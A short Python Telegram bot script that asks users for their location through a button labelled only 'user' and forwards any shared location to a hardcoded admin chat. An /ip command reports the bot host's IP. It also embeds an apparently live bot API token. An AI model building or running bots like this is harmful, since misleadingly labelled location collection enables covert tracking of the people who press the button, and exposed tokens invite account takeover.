import telebot
from telebot import types

import socket

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address
bot = telebot.TeleBot('6915637025:AAH-5PX-V9AqdcNCKe3PKt95BLqBmBS9gn4')
admin_id = '5606068470'



@bot.message_handler(commands=["start"])
def start (message):
    #Клавиатура с кнопкой запроса локации
    keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    button_geo = types.KeyboardButton(text="user", request_location=True)
    keyboard.add(button_geo)
    bot.send_message(message.chat.id, message, reply_markup=keyboard)
#Получаю локацию
@bot.message_handler(content_types=['location'])
def location (message):
    if message.location is not None:
        print(message.location)
        bot.send_message(admin_id, message.location)

@bot.message_handler(commands=['ip'])
def ip (message):
        bot.send_message(admin_id, get_ip_address())

bot.polling(none_stop=True)